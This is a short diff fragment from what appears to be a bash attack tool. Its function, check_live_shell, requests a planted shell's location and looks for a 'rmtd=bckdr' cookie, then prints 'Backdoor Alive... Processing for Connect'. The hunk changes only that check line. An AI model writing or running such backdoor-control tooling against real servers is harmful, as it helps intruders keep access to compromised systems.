@@ -320,7 +320,7 @@ exit
 fi
 }
 check_live_shell() {
-        response=$(timeout 3 curl -s -i $shell_loc | grep rmtd=bckdr)
+        response=$(curl -s -i $shell_loc | grep "Set-Cookie: rmtd=bckdr")
 if [[ $response =~ "Set-Cookie: rmtd=bckdr" ]];then
 printf "  ${yellow}[!]${green} Backdoor Alive... Processing for Connect\n"
 else
